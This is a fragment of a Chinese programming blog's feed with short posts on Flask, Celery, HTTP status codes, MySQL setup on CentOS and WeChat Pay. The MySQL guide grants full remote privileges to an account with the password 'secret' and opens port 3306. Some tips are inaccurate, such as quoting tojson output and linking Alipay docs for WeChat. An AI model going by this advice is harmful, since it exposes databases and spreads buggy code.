Safari/537.36&quot;,</span><br><span class="line">        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req = request.Request(url=url, data=data, headers=headers)</span><br><span class="line">    rsp = request.urlopen(req)</span><br><span class="line"></span><br><span class="line">    html = rsp.read().decode()</span><br><span class="line">    print(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    youdao(&quot;girl&quot;)</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js破解</tag>
      </tags>
  </entry>
  <entry>
    <title>flask前端如何防止刷新重复提交表单</title>
    <url>/2019/05/19/form-reflash/</url>
    <content><![CDATA[<p>防止刷新重复提交表单<br><a id="more"></a></p>
<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>有很多做全栈开发的小伙伴发现，刷新页面后，form中的数据会重复提交，这对于用户的使用是十分烦恼的，有两种方法可以解决这些问题</p>
<h2 id="后端处理redirect跳转到当前页面"><a href="#后端处理redirect跳转到当前页面" class="headerlink" title="后端处理redirect跳转到当前页面"></a>后端处理redirect跳转到当前页面</h2><p>这种方式比较简单好用，处理完form的数据之后，我们重定向到当前的页面</p>
<h2 id="后端session比对"><a href="#后端session比对" class="headerlink" title="后端session比对"></a>后端session比对</h2><p>将form的所有数据加起来然后Md5一下，存在session里，下次收到数据在处理前也将所有相同的数据加起来Md5一下，对比session里的数据，如果一样就表示是重复提交，拒绝操作。防止用户手动把两次form值都填一下而无法提交，也可以加一个当前时间的hidden来判定一下。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>防止刷新重复提交表单</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Flask-Migrate 检测不到db.string() 长度变化</title>
    <url>/2019/05/15/flask-string/</url>
    <content><![CDATA[<p>解决Flask-Migrate 检测不到db.string() 长度变化<br><a id="more"></a></p>
<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>在我们使用命令<code>python manage.py db migrate</code>时，对于string字符长度的改变没用侦测到，这里让人十分苦恼</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>修改migrations下的env.py<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">context.configure(connection=connection,</span><br><span class="line">...</span><br><span class="line">中加上</span><br><span class="line">compare_type = True 即可</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>flask分页的示例教学，flask的paginate的使用技巧</title>
    <url>/2019/05/15/flask-paginate/</url>
    <content><![CDATA[<p>flask分页的示例教学，flask的paginate的使用技巧<br><a id="more"></a></p>
<h1 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index():</span><br><span class="line">    # ...</span><br><span class="line">    page = request.args.get(&apos;page&apos;, 1, type=int)</span><br><span class="line">    pagination = 表名.query.order_by(表名.timestamp.desc()).paginate(</span><br><span class="line">        page, per_page=每页数量, error_out=False)</span><br><span class="line">    return render_template(&apos;index.html&apos;,form=form,pagination=pagination)</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，order_by中是表中字段排名的顺利选择</p>
<h1 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for post in posts.items %&#125;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">  &#123;&#123;post.author.nickname&#125;&#125; says: &lt;b&gt;&#123;&#123;post.body&#125;&#125;&lt;/b&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% if posts.has_prev %&#125;&lt;a href=&quot;&#123;&#123; url_for(&apos;index&apos;, page = posts.prev_num) &#125;&#125;&quot;&gt;&lt;&lt; 上一页&lt;/a&gt;&#123;% else %&#125;&lt;&lt; 上一页&#123;% endif %&#125; |</span><br><span class="line">&#123;% if posts.has_next %&#125;&lt;a href=&quot;&#123;&#123; url_for(&apos;index&apos;, page = posts.next_num) &#125;&#125;&quot;&gt;下一页 &gt;&gt;&lt;/a&gt;&#123;% else %&#125;下一页 &gt;&gt;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>flask中如何将模板的变量传递到JavaScript中</title>
    <url>/2019/05/15/flaks-template-js/</url>
    <content><![CDATA[<p>flask中如何将模板的变量传递到JavaScript中<br><a id="more"></a></p>
<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><p>将变量传递到template模板中去<br>像这样<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def hello():</span><br><span class="line">    a=1</span><br><span class="line">    return render_template(&apos;template.html&apos;, a=a）</span><br></pre></td></tr></table></figure></p>
<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>在JavaScript中定义全局变量<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var a = &apos;&#123;&#123; a|tojson &#125;&#125;&apos;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>注意，变量的大括号外面用单引号引起来</li>
<li>变量的后面是”|”,然后加上tojson</li>
</ol>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>kombu.exceptions.EncodeError EncodeError</title>
    <url>/2019/05/07/celery-kombu-exception/</url>
    <content><![CDATA[<p>kombu.exceptions.EncodeError EncodeError: &lt;flask_mail.Message object at 0x7fe0b576f510&gt; is not JSON serializable<br><a id="more"></a></p>
<h1 id="kombu-exceptions-EncodeError-EncodeError-lt-flask-mail-Message-object-at-0x7fe0b576f510-gt-is-not-JSON-serializable-解决办法"><a href="#kombu-exceptions-EncodeError-EncodeError-lt-flask-mail-Message-object-at-0x7fe0b576f510-gt-is-not-JSON-serializable-解决办法" class="headerlink" title="kombu.exceptions.EncodeError EncodeError: &lt;flask_mail.Message object at 0x7fe0b576f510&gt; is not JSON serializable 解决办法"></a>kombu.exceptions.EncodeError EncodeError: &lt;flask_mail.Message object at 0x7fe0b576f510&gt; is not JSON serializable 解决办法</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">把邮件的标题发送者等信息写道celery的task当中，而不是写在其他地方</span><br><span class="line"><span class="meta">@celery.task</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">send_async_email</span><span class="params">(to)</span>:</span></span><br><span class="line">     <span class="string">"""Background task to send an email with Flask-Mail."""</span></span><br><span class="line">     subject = <span class="string">"Hello from me"</span></span><br><span class="line">     sender = app.config[<span class="string">'MAIL_DEFAULT_SENDER'</span>]</span><br><span class="line">     recipients = [to]</span><br><span class="line">     msg = Message(subject, sender=sender, recipients=recipients)</span><br><span class="line">     msg.body = <span class="string">'This is a test email sent from a background Celery task.'</span></span><br><span class="line">     <span class="keyword">with</span> app.app_context():</span><br><span class="line">         mail.send(msg)</span><br></pre></td></tr></table></figure>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>celery默认的json数据，有些数据不能转化为json数据<br>当然可以定义出celery的默认数据类型</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/06/celery-1/">分布式任务队列Celery的特性</a></li><li><a href="https://thelighter.github.io/2019/02/06/celery_error/">使用Celery时候报错AttributeError: 'float' object has no attribute 'items'</a></li></ul></div>]]></content>
      <categories>
        <category>celery</category>
      </categories>
      <tags>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式任务队列Celery的特性</title>
    <url>/2019/05/06/celery-1/</url>
    <content><![CDATA[<p>分布式任务队列Celery的介绍<br><a id="more"></a></p>
<h1 id="特性介绍"><a href="#特性介绍" class="headerlink" title="特性介绍"></a>特性介绍</h1><ol>
<li>任务执行同主程序完全脱离，非阻塞不影响主进程</li>
<li>可以分布式，远程连接</li>
<li>可以采用多个协程，应对高并发高负载</li>
</ol>
<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>这里用一张图说明</p>
<p><img src="http://www.bjhee.com/wp-content/uploads/2016/11/celery.png" alt></p>
<ol>
<li><p>消息中间件 Broker<br>消息中间件，就是任务调度队列，通常以独立服务形式出现。它是一个生产者消费者模式，即主程序将任务放入队列中，而后台职程则会从队列中取出任务并执行。任务可以按顺序调度，也可以按计划时间调度。Celery组件本身并不提供队列服务，你需要集成第三方消息中间件。Celery推荐的有RabbitMQ和Redis</p>
</li>
<li><p>任务单元  Worker<br>即执行任务的程序，可以有多个并发。它实时监控消息队列，获取队列中调度的任务，并执行</p>
</li>
<li><p>结果存储 Backend<br>由于任务的执行同主程序分开，如果主程序想获取任务执行的结果，就必须通过中间件存储。同消息中间人一样，存储也可以使用RabbitMQ、Redis</p>
</li>
</ol>
<h1 id="多进程与多线程"><a href="#多进程与多线程" class="headerlink" title="多进程与多线程"></a>多进程与多线程</h1><p>默认启动<code>celery worker -A tasks --loglevel=info --concurrency=5</code>这里是多进程方式启动的<br>多协程方式启动<code>celery worker -A tasks --loglevel=info -P gevent -c 100</code></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/05/07/celery-kombu-exception/">kombu.exceptions.EncodeError EncodeError</a></li><li><a href="https://thelighter.github.io/2019/02/06/celery_error/">使用Celery时候报错AttributeError: 'float' object has no attribute 'items'</a></li></ul></div>]]></content>
      <categories>
        <category>celery</category>
      </categories>
      <tags>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP状态码分类以及具体代表的含义</title>
    <url>/2019/05/02/statuscode/</url>
    <content><![CDATA[<p>HTTP状态码<br><a id="more"></a></p>
<h1 id="HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用"><a href="#HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用" class="headerlink" title="HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用"></a>HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用</h1><h2 id="HTTP状态码共分为5种类型："><a href="#HTTP状态码共分为5种类型：" class="headerlink" title="HTTP状态码共分为5种类型："></a>HTTP状态码共分为5种类型：</h2><p>1<strong>    信息，服务器收到请求，需要请求者继续执行操作<br>2</strong>    成功，操作被成功接收并处理<br>3<strong>    重定向，需要进一步的操作以完成请求<br>4</strong>    客户端错误，请求包含语法错误或无法完成请求<br>5**    服务器错误，服务器在处理请求的过程中发生了错误</p>
<h1 id="HTTP状态码列表"><a href="#HTTP状态码列表" class="headerlink" title="HTTP状态码列表"></a>HTTP状态码列表</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100	Continue	继续。客户端应继续其请求</span><br><span class="line">101	Switching Protocols	切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</span><br><span class="line">200	OK	请求成功。一般用于GET与POST请求</span><br><span class="line">201	Created	已创建。成功请求并创建了新的资源</span><br><span class="line">202	Accepted	已接受。已经接受请求，但未处理完成</span><br><span class="line">203	Non-Authoritative Information	非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</span><br><span class="line">204	No Content	无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</span><br><span class="line">205	Reset Content	重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</span><br><span class="line">206	Partial Content	部分内容。服务器成功处理了部分GET请求</span><br><span class="line">300	Multiple Choices	多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</span><br><span class="line">301	Moved Permanently	永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</span><br><span class="line">302	Found	临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</span><br><span class="line">303	See Other	查看其它地址。与301类似。使用GET和POST请求查看</span><br><span class="line">304	Not Modified	未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</span><br><span class="line">305	Use Proxy	使用代理。所请求的资源必须通过代理访问</span><br><span class="line">306	Unused	已经被废弃的HTTP状态码</span><br><span class="line">307	Temporary Redirect	临时重定向。与302类似。使用GET请求重定向</span><br><span class="line">400	Bad Request	客户端请求的语法错误，服务器无法理解</span><br><span class="line">401	Unauthorized	请求要求用户的身份认证</span><br><span class="line">402	Payment Required	保留，将来使用</span><br><span class="line">403	Forbidden	服务器理解请求客户端的请求，但是拒绝执行此请求</span><br><span class="line">404	Not Found	服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置&quot;您所请求的资源无法找到&quot;的个性页面</span><br><span class="line">405	Method Not Allowed	客户端请求中的方法被禁止</span><br><span class="line">406	Not Acceptable	服务器无法根据客户端请求的内容特性完成请求</span><br><span class="line">407	Proxy Authentication Required	请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</span><br><span class="line">408	Request Time-out	服务器等待客户端发送的请求时间过长，超时</span><br><span class="line">409	Conflict	服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突</span><br><span class="line">410	Gone	客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</span><br><span class="line">411	Length Required	服务器无法处理客户端发送的不带Content-Length的请求信息</span><br><span class="line">412	Precondition Failed	客户端请求信息的先决条件错误</span><br><span class="line">413	Request Entity Too Large	由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</span><br><span class="line">414	Request-URI Too Large	请求的URI过长（URI通常为网址），服务器无法处理</span><br><span class="line">415	Unsupported Media Type	服务器无法处理请求附带的媒体格式</span><br><span class="line">416	Requested range not satisfiable	客户端请求的范围无效</span><br><span class="line">417	Expectation Failed	服务器无法满足Expect的请求头信息</span><br><span class="line">500	Internal Server Error	服务器内部错误，无法完成请求</span><br><span class="line">501	Not Implemented	服务器不支持请求的功能，无法完成请求</span><br><span class="line">502	Bad Gateway	作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</span><br><span class="line">503	Service Unavailable	由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</span><br><span class="line">504	Gateway Time-out	充当网关或代理的服务器，未及时从远端服务器获取请求</span><br><span class="line">505	HTTP Version not supported	服务器不支持请求的HTTP协议的版本，无法完成处理</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>状态码</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS 7 下 Yum 安装 MySQL 5.7</title>
    <url>/2019/05/02/mysql-1/</url>
    <content><![CDATA[<p>CentOS 7 下 Yum 安装 MySQL 5.7<br><a id="more"></a></p>
<h1 id="去-MySQL-官网下载-YUM-的-RPM-安装包"><a href="#去-MySQL-官网下载-YUM-的-RPM-安装包" class="headerlink" title="去 MySQL 官网下载 YUM 的 RPM 安装包"></a>去 MySQL 官网下载 YUM 的 RPM 安装包</h1><p><code>$ wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</code><br>安装 mysql 源<br><code>$ sudo yum localinstall mysql57-community-release-el7-11.noarch.rpm</code></p>
<h1 id="检查-yum-源是否安装成功"><a href="#检查-yum-源是否安装成功" class="headerlink" title="检查 yum 源是否安装成功"></a>检查 yum 源是否安装成功</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo yum repolist enabled | grep &quot;mysql.*-community.*&quot;</span><br><span class="line">mysql-connectors-community           MySQL Connectors Community              21</span><br><span class="line">mysql-tools-community                MySQL Tools Community                   38</span><br><span class="line">mysql57-community                    MySQL 5.7 Community Server             130</span><br><span class="line">如上所示，找到了 mysql 的安装包</span><br></pre></td></tr></table></figure>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><code>$ sudo yum install mysql-community-server</code></p>
<p><code>$ sudo systemctl enable mysqld</code><br>启动服务</p>
<p><code>$ sudo systemctl start mysqld</code><br>查看服务状态</p>
<p><code>$ sudo systemctl status mysqld</code></p>
<h1 id="修改-root-默认密码"><a href="#修改-root-默认密码" class="headerlink" title="修改 root 默认密码"></a>修改 root 默认密码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL 5.7 启动后，在 /var/log/mysqld.log 文件中给 root 生成了一个默认密码。通过下面的方式找到 root 默认密码，然后登录 mysql 进行修改：</span><br><span class="line"></span><br><span class="line">$ grep &apos;temporary password&apos; /var/log/mysqld.log</span><br><span class="line">[Note] A temporary password is generated for root@localhost: **********</span><br><span class="line">登录 MySQL 并修改密码</span><br><span class="line"></span><br><span class="line">$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">mysql&gt; ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;MyNewPass4!&apos;;</span><br></pre></td></tr></table></figure>
<h1 id="添加远程登录用户"><a href="#添加远程登录用户" class="headerlink" title="添加远程登录用户"></a>添加远程登录用户</h1><p>MySQL 默认只允许 root 帐户在本地登录，如果要在其它机器上连接 MySQL，必须修改 root 允许远程连接，或者添加一个允许远程连接的帐户，为了安全起见，本例添加一个新的帐户：</p>
<p><code>mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &#39;admin&#39;@&#39;%&#39; IDENTIFIED BY &#39;secret&#39; WITH GRANT OPTION;</code></p>
<h1 id="配置默认编码为-utf8"><a href="#配置默认编码为-utf8" class="headerlink" title="配置默认编码为 utf8"></a>配置默认编码为 utf8</h1><p>MySQL 默认为 latin1, 一般修改为 UTF-8<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vi /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line"># 在myslqd下添加如下键值对</span><br><span class="line">character_set_server=utf8</span><br><span class="line">init_connect=&apos;SET NAMES utf8&apos;</span><br></pre></td></tr></table></figure></p>
<h1 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo firewall-cmd --zone=public --add-port=3306/tcp --permanent</span><br><span class="line">$ sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/04/20/centos7-python3-6-8/">centos7安装python3.6.8，安装pip，centos7的virtualenv和mkvirtualenv安装,pip换aliyun源</a></li></ul></div>]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>centos7</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask-WXPay使用教程</title>
    <url>/2019/05/02/weixin-pay-module/</url>
    <content><![CDATA[<p>一个微信支付的Flask插件, 微信支付API<br><a id="more"></a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><code>pip install Flask-WXPay</code></p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask_wxpay import WXPay</span><br><span class="line">wxpay = WXPay()</span><br><span class="line">wxpay.init_app(app)</span><br><span class="line">创建订单,生成prepay data:</span><br><span class="line"></span><br><span class="line">from flask_wxpay import now_str</span><br><span class="line">from core import wxpay</span><br><span class="line"></span><br><span class="line">out_trade_no = now_str()</span><br><span class="line">order_data = wxpay.unified_order(out_trade_no, price, ip, body, openid=openid)</span><br><span class="line">prepay_data = wxpay.get_jsapi_prepay_data(order_data[&apos;prepay_id&apos;])</span><br></pre></td></tr></table></figure>
<h1 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h1><p>写到配置文件即可<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WXPAY_BASE_URL	默认值: https://api.mch.weixin.qq.com</span><br><span class="line">WXPAY_REQUEST_TIMEOUT	默认值: 10</span><br><span class="line">WX_APPID	公众账号ID</span><br><span class="line">WXPAY_MCHID	商户号</span><br><span class="line">WXPAY_KEY	商户支付密钥Key</span><br><span class="line">WXPAY_NOTIFY_URL	默认异步通知url</span><br><span class="line">WXPAY_ROOTCA_PATH	rootca证书路径，对应requests的verify参数,默认为None</span><br><span class="line">WXPAY_APICLIENT_CERT_PATH	客户端证书路径，默认值None</span><br><span class="line">WXPAY_APICLIENT_KEY_PATH	客户端证书key的路径，默认值None</span><br><span class="line">WXPAY_SANDBOX	是否使用沙箱环境，默认为 False</span><br></pre></td></tr></table></figure></p>
<h1 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h1><p><code>https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=9_1</code></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
  </entry>
  <entry>
    <title>Flask 处理微信支付的回调notify_url</title>
    <url>/2019/05/02/weixin-pay/</url>
    <content><![CDATA[<p>Flask 处理微信支付的回调notify_url<br><a id="more"></a></p>
<h1 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h1><p><code>https://docs.open.alipay.com/59/103927</code></p>
<h1 id="不同于支付宝"><a href="#不同于支付宝" class="headerlink" title="不同于支付宝"></a>不同于支付宝</h1><p>微信支付成功后，微信服务器会以 post 方式回调 notify_url。由于是bytes的数据，需要使用 request.get_data() 方法</p>
<h1 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h1><p>request.get_data() 方法获取到的是 bytes ，所以需要将其 decode 成 str<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例代码</span><br><span class="line">@wechat.route(&apos;/notify_url&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def notify_url():</span><br><span class="line">    import xml.etree.ElementTree as et</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    data = data.decode(&apos;utf-8&apos;)</span><br><span class="line">    root = et.fromstring(data)</span><br><span class="line"></span><br><span class="line">    return_code = root.find(&apos;.//return_code&apos;)</span><br><span class="line">    out_trade_no = root.find(&apos;.//out_trade_no&apos;)</span><br><span class="line">    print(return_code.text, out_trade_no.text)</span><br></pre></td></tr></table></figure></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>微信支付</tag>
      </tags>
  </entry>
  <entry>
    <title>bootstrap左边导航右边网页的模板</title>
    <url>/2019/05/02/bootstrap-zyjg/</url>
    <content><![CDATA[<p>bootstrap左边导航右边网页的模板<br><a id="more"></a></p>
<h1 id="模板地址"><a href="#模板地址" class="headerlink" title="模板地址"></a>模板地址</h1><p><a href="https://v3.bootcss.com/examples/dashboard/" target="_blank" rel="noopener">https://v3.bootcss.com/examples/dashboard/</a></p>
<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p><img src="https://res.cloudinary.com/dherizchh/image/upload/v1556801863/bootstrap1.png" alt></p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>bootstrap</category>
      </categories>
      <tags>
        <tag>bootstrap</tag>
      </tags>
  </entry>
  <entry>
    <title>re-online,re正则表达式在线生成网站</title>
    <url>/2019/05/02/re-online/</url>
    <content><![CDATA[<h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><p>输入条件一键生成</p>
<h1 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h1><p><code>https://regex101.com/</code><br><a id="more"></a></p>
